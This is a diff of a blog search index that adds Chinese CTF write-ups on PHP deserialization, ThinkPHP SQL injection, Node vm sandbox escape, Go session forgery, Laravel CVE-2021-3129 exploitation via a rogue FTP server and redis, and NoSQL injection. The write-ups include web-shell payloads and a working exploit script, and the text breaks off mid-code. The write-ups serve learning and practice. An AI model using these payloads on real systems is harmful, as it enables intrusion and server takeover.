@@ -4,6 +4,195 @@
   
   
   <entry>
+    <title>天翼杯复现</title>
+    <link href="/2021/10/10/2021-10-%E5%A4%A9%E7%BF%BC%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
+    <url>/2021/10/10/2021-10-%E5%A4%A9%E7%BF%BC%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
+    
+    <content type="html"><![CDATA[<h1 id="easy-eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h1><p>进入首先是一个反序列化加绕过，这里可以用大小写绕过和基类绕过，wakeup改属性就行</p><p>将正常payload</p><p><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:64:&quot;file_put_contents(&#39;./shell.php&#39;,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);&quot;;&#125;&#125;</code></p><p>改为</p><p><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:64:&quot;file_put_contents(&#39;./shell.php&#39;,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);&quot;;&#125;&#125;</code></p><p>网上一些师傅还提供了基类的绕过</p><p><code>O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;test&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;</code></p><p>还可以省略末尾的大括号,call提到wakeup前绕过</p><p><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p><p>用蚁剑脸上之后终端是没有命令权限的，但是可以看到swp文件，vim看一下发现和redis数据库有关，并且给了密码。</p><p><img src="https://img-blog.csdnimg.cn/caa0927d818f4571ad43437ddffd911d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>开启了redis就很显然了，用给的密码认证连接redis，上传.so文件，moudle加载执行命令即可。</p><h1 id="Eztp"><a href="#Eztp" class="headerlink" title="Eztp"></a>Eztp</h1><p>thinkPHP源码审计，考的是5.0.4版本<code>select</code>方法漏洞</p><p>原理可参考<a href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83</a></p><p>这里简单复现了一下漏洞，入口index代码如下。ThinkPHP5.0版本默认的变量修饰符是<code>/s</code>，这里<code>/a</code>意思是如果你要获取的数据为数组，需要用<code>/a</code>才能转换</p><p><img src="https://img-blog.csdnimg.cn/9603ff8a29f94539ad8cd57823366ddb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>先进行数据库初始化，然后进入<code>where</code>函数</p><p><img src="https://img-blog.csdnimg.cn/302b8ff89f6a4278a45f7999de060b6d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>出where方法后<code>$options</code>里多了两个数组。</p><p>之后进入关键的<code>select</code>函数，关键在生成sql语句的过程。在 <strong>select</strong> 方法中，程序会对 <strong>SQL</strong> 语句模板用变量填充，其中用来填充 <strong>%WHERE%</strong> 的变量中存在用户输入的数据。我们跟进这个 <strong>where</strong> 分析函数，会发现其会调用生成查询条件 <strong>SQL</strong> 语句的 <strong>buildWhere</strong> 函数。</p><p><img src="https://img-blog.csdnimg.cn/3cd95db4dd724a4287e5f43090fa5f56.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>漏洞产生地方在于检测操作符的过程,这里可以看到检测。当<code>$this-&gt;exp[$exp]</code>中含有<code>not like</code>时会将用户控制的变量直接进行赋值。</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211011212308025.png" alt="image-20211011212308025"></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211011212902036.png" alt="image-20211011212902036"></p><p>后面就构造成了我们想要的payload，拿一张网上的图</p><p><img src="https://mochazz.github.io/img/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/7.png" alt="img"></p><blockquote><p>正是由于 <strong>ThinkPHP</strong> 官方的 <strong>filterValue</strong> 方法漏过滤了 <strong>NOT LIKE</strong> ，同时 <strong>MYSQL</strong> 逻辑操作由用户变量控制，使得这一漏洞可以被利用。</p></blockquote><p>攻击结果</p><p><img src="https://img-blog.csdnimg.cn/569aadf8084f433e89fbeb72899d15d3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>但是nss靶场的题目环境似乎有点问题，注入进不到后台。直接看后面的反序列化吧</p><p>参考：<a href="https://www.anquanke.com/post/id/251318#h2-1">https://www.anquanke.com/post/id/251318#h2-1</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>nodejs</title>
+    <link href="/2021/10/08/2021-10-nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8(1)/"/>
+    <url>/2021/10/08/2021-10-nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8(1)/</url>
+    
+    <content type="html"><![CDATA[<h3 id="沙箱机制"><a href="#沙箱机制" class="headerlink" title="沙箱机制"></a>沙箱机制</h3><p>沙箱机制简单来讲是一个隔离得虚拟环境，能够独立的在这个虚拟环境内运行代码，但是不会影响外界代码，能够屏蔽上下文，隔离当前的执行环境，避免被恶意代码攻击。</p><p>日常开发需求中有时候为了追求灵活性或降低开发难度，会在业务代码里直接使用 eval/Function/vm 等功能，其中 eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，会存在安全问题。 node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击，但实际上vm沙箱也存在安全漏洞。</p><h1 id="vm沙箱"><a href="#vm沙箱" class="headerlink" title="vm沙箱"></a>vm沙箱</h1><p>VM模块包含了三个常用的方法，用于创建独立运行的沙箱体制，如下三个方法：</p><p><code>vm.runInContext,vm.runInNewContext,vm.runInThisContext</code></p><p>此方法用于创建一个独立的沙箱运行空间，code内的代码可以访问外部的global对象，但是不能访问其他变量.而且code内部global与外部共享</p><p><img src="https://img-blog.csdnimg.cn/20190320113225298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZlbmdkaWppYW5n,size_16,color_FFFFFF,t_70" alt="img"></p><p>具体可以看看文档<a href="http://nodejs.cn/api/vm.html">http://nodejs.cn/api/vm.html</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先看一下简单的逃逸</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;goin&#x27;</span>);<br>vm.runInContext(<span class="hljs-string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;out&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>上述代码在第三行结束了主程序运行，并且报错。</p><p><img src="https://img-blog.csdnimg.cn/7688fc4098534439857382179e98c1a2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="vm2沙箱逃逸"><a href="#vm2沙箱逃逸" class="headerlink" title="vm2沙箱逃逸"></a>vm2沙箱逃逸</h1><p>参考：<a href="https://prontosil.top/posts/9c09dcd4/">https://prontosil.top/posts/9c09dcd4/</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>nodejs</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>祥云杯java</title>
+    <link href="/2021/10/07/2021-10-%E7%A5%A5%E4%BA%91%E6%9D%AFjava/"/>
+    <url>/2021/10/07/2021-10-%E7%A5%A5%E4%BA%91%E6%9D%AFjava/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>javaweb</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>羊城杯</title>
+    <link href="/2021/09/30/2021-10-%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
+    <url>/2021/09/30/2021-10-%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
+    
+    <content type="html"><![CDATA[<h1 id="checkin-go"><a href="#checkin-go" class="headerlink" title="checkin_go"></a>checkin_go</h1><p>go框架第一次遇到。搭了下go环境顺便学了一下基本语法。</p><p>审计源码可以发现，出题人用了<code>gin</code>框架，启用了基于cookie的session。mian函数里面加了几个路由，审计一下关键的中间件处理。</p><p><img src="https://img-blog.csdnimg.cn/dcd4373cc1b44431b97916d9b15cf51a.png" alt="在这里插入图片描述"></p><p>​    </p><p>默认界面需要登录和经典绕过hash验证。但这里很奇怪，不能admin登录但后面需要以admin身份买flag。所以这里的思路是伪造session。</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20210922190932821.png" alt="image-20210922190932821"></p><p>伪造session可行还有一个原因就是go语言下<code>math/rand</code>库中rand函数如果没有指定密钥，只是指定了输出长度，默认的输出结果是一样的，所以这里可以在本地跑源码拿cookie来进行伪造。下一关就是买flag，但是自己只有5000，买flag要两万，这里两个思路，一个是整数溢出将flag价格减为0，另一个是在本地将<code>checkNowMoney</code>设置等于<code>checkPlayerMoney</code>，然后拿cookie。</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-comment">//伪造cookie</span><br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;math/rand&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span><br><span class="hljs-string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>storage := cookie.NewStore(randomChar(<span class="hljs-number">16</span>))<br>r.Use(sessions.Sessions(<span class="hljs-string">&quot;o&quot;</span>, storage))<br>r.GET(<span class="hljs-string">&quot;/a&quot;</span>, cookieHandler)<br>r.Run(<span class="hljs-string">&quot;127.0.0.1:20702&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// func cookieHandler(c *gin.Context) &#123;</span><br><span class="hljs-comment">// s := sessions.Default(c)</span><br><span class="hljs-comment">// s.Set(&quot;uname&quot;, &quot;admin&quot;)</span><br><span class="hljs-comment">// s.Save()</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">cookieHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>s := sessions.Default(c)<br><span class="hljs-comment">//s.Set(&quot;uname&quot;, &quot;admin&quot;)</span><br><span class="hljs-comment">//fmt.Println(s.Get(&quot;uname&quot;))</span><br><span class="hljs-comment">//fmt.Println(s.Get(&quot;nowMoney&quot;))</span><br>s.Set(<span class="hljs-string">&quot;nowMoney&quot;</span>, <span class="hljs-number">5000</span>)<br><span class="hljs-comment">//fmt.Println(s.Get(&quot;playerMoney&quot;))</span><br><span class="hljs-comment">//fmt.Println(s.Get(&quot;checkNowMoney&quot;))</span><br>s.Set(<span class="hljs-string">&quot;checkNowMoney&quot;</span>, s.Get(<span class="hljs-string">&quot;checkPlayerMoney&quot;</span>))<br><span class="hljs-comment">//fmt.Println(s.Get(&quot;checkPlayerMoney&quot;))</span><br>s.Save()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">randomChar</span><span class="hljs-params">(l <span class="hljs-keyword">int</span>)</span> []<span class="hljs-title">byte</span></span> &#123;<br>output := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, l)<br>rand.Read(output)<br><span class="hljs-keyword">return</span> output<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4aa4f21ebdf643e3be9df6440818c414.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这个题其实借鉴了wmctf的一个go题：<a href="https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/">https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/</a></p><h1 id="Cross-The-Side"><a href="#Cross-The-Side" class="headerlink" title="Cross The Side"></a>Cross The Side</h1><p>Laravel v8.26.1 (PHP v7.4.15）远程代码执行漏洞（CVE-2021-3129）</p><p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。但是我用这个打的时候一直报错php内存耗尽，应该是由于该网站的日志文件太大，超出内存，无法进行利，估计是phpini的配置不同专门限制了这种方法，可惜没有看到网上还有一种做法，可以联合ssrf打内网服务。</p><p>这里信息搜集的时候是可以看到dump.rdb，提示了开启了redis服务，这里就是可以用<code>file_get_contents</code>和<code>file_get_contents</code>来打redis了，因为这两个函数不支持gopher协议，这里采用ftp协议，上传文件时请求我们起的恶意服务器，告诉客户端获取数据的ip和端口去下载数据，<code>file_put_contents</code>时再将ip和端口重定向到内网的redis服务，然后发送我们的payload恶意数据，这样就实现了ssrf获取shell。</p><p>大致过程如图</p><p><img src="https://img-blog.csdnimg.cn/72f52eda18cc4008ad18ece1d48c2085.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>贴一下exp,ftp状态码可参考</p><p><a href="https://blog.csdn.net/qq981378640/article/details/51254177">https://blog.csdn.net/qq981378640/article/details/51254177</a></p><p><a href="http://www.hackdig.com/06/hack-372823.htm">http://www.hackdig.com/06/hack-372823.htm</a></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">payload = unquote(<span class="hljs-string">&quot;%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B123%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;</span>)<br>payload = payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>port = <span class="hljs-number">23</span><br>sk = socket.socket()<br>sk.bind((host, port))<br>sk.listen(<span class="hljs-number">5</span>)<br><span class="hljs-comment"># ftp被动模式的passvie port,监听到1234</span><br>sk2 = socket.socket()<br>sk2.bind((host, <span class="hljs-number">1234</span>))<br>sk2.listen()<br><span class="hljs-comment"># 计数器，用于区分是第几次ftp连接</span><br>count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    conn, address = sk.accept()<br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># USER aaa\r\n  客户端传来用户名</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;220 ready\n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 ready\n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;215 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># SIZE /123\r\n  客户端询问文件/123的大小</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;213 3 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;300 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># EPSV\r\n&#x27;</span><br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 192,168,160,129,4,210\n&quot;</span>)  <span class="hljs-comment"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span><br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 127,0,0,1,24,235\n&quot;</span>)  <span class="hljs-comment"># 端口计算规则：24*256+235=9000</span><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;125 \n&quot;</span>) <span class="hljs-comment"># 告诉客户端可以开始数据链接了</span><br>        <span class="hljs-comment"># 新建一个socket给服务端返回我们的payload</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;建立连接!&quot;</span>)<br>        conn2, address2 = sk2.accept()<br>        conn2.send(payload)<br>        conn2.close()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;断开连接!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;150 \n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))<br>        exit()<br>    <span class="hljs-comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;226 \n&quot;</span>)<br>    conn.close()<br>    count += <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>下篇再总结下ftp打mysql打redis等等攻击。</p><h1 id="Only-4"><a href="#Only-4" class="headerlink" title="Only 4"></a>Only 4</h1><p>预期解需要扫到<code>searlize.php</code>显然有点扯</p><p>非预期是日志文件包含getshell。直接包含PHP_SESSION_UPLOAD_PROGRESS。session文件在/var/lib/php5/sess_rayi。脚本就不贴了</p><h1 id="No-sql"><a href="#No-sql" class="headerlink" title="No sql"></a>No sql</h1><p>cms框架来源于<a href="http://cn-sec.com/archives/335315.html">http://cn-sec.com/archives/335315.html</a> 考察nosql注入</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>羊城杯</title>
+    <link href="/2021/09/26/2021-10-java%E5%AE%A1%E8%AE%A1(1)/"/>
+    <url>/2021/09/26/2021-10-java%E5%AE%A1%E8%AE%A1(1)/</url>
+    
+    <content type="html"><![CDATA[<p>参考：<a href="https://xz.aliyun.com/t/7945#toc-27">https://xz.aliyun.com/t/7945#toc-27</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>nosql</title>
+    <link href="/2021/09/20/2021-10-nosql%E6%B3%A8%E5%85%A5(1)/"/>
+    <url>/2021/09/20/2021-10-nosql%E6%B3%A8%E5%85%A5(1)/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Mogodb数据库"><a href="#Mogodb数据库" class="headerlink" title="Mogodb数据库"></a>Mogodb数据库</h1><p>在 <a href="https://cloud.tencent.com/product/cdb?from=10680">MySQL</a> 中，我们所熟知的几个最常见的概念是数据库 (Database)、表 (Table)、字段 (Column)、记录 (Record)、索引 (Index)，这些术语映射到 MongoDB 中大概等价于数据库 (Database)、集合 (Collection)、域 (Field)、文档 (Document)、索引 (Index)。一些基本操作可以看文档</p><h1 id="经典注入方式"><a href="#经典注入方式" class="headerlink" title="经典注入方式"></a>经典注入方式</h1><h3 id="永真注入"><a href="#永真注入" class="headerlink" title="永真注入"></a>永真注入</h3><p>利用的原理类似于万能密码，使查询的判定结果永远为true</p><p>例如当为如下查询语句时，当get传参为<code>?username[$ne]=1&amp;password[$ne]=1</code>则传入mogodb后成为了一个条件查询。即为查询username和password不等于1的数据，当然这只是一个简单的例子，这里也可以用其他的条件操作符。</p><p><img src="https://img-blog.csdnimg.cn/36584b6cdcc5432a80bfeac368c97e18.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># 查询语句</span><br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Query(<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;uname&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>],<br>    <span class="hljs-string">&#x27;pwd&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>));<br><span class="hljs-comment"># 执行语句</span><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeQuery(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;toArray();<br></code></pre></div></td></tr></table></figure><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>我们都知道在 SQL 时代拼接字符串容易造成 SQL 注入，NoSQL 也有类似问题，但是现在无论是 PHP 的 MongoDB driver 还是 node.js 的 mongoose 都必须要求查询条件必须是一个数组或者 query 对象了，因此简单看一下就好。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">string</span> query =<span class="hljs-string">&quot;&#123; username: &#x27;&quot;</span> + <span class="hljs-variable">$username</span> + <span class="hljs-string">&quot;&#x27;, password: &#x27;&quot;</span> + <span class="hljs-variable">$password</span> + <span class="hljs-string">&quot;&#x27; &#125;&quot;</span>  <span class="hljs-comment">#查询语句</span><br></code></pre></div></td></tr></table></figure><p>这里构造payload</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">username=admin<span class="hljs-string">&#x27;,&#123;$or:[&#123;&#125;,&#123;&#x27;</span>a<span class="hljs-string">&#x27;:&#x27;</span>a&amp;password=<span class="hljs-string">&#x27;&#125;]</span><br></code></pre></div></td></tr></table></figure><p>这样最终的查询语句就变为</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">&#123; username: <span class="hljs-string">&#x27;admin&#x27;</span>,&#123;<span class="hljs-variable">$or</span>:[&#123;&#125;,&#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>, password: <span class="hljs-string">&#x27;&#x27;</span>&#125;] &#125;<br>在后端中即为：&#123; username: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$or</span>: [ &#123;&#125;, &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>, password:<span 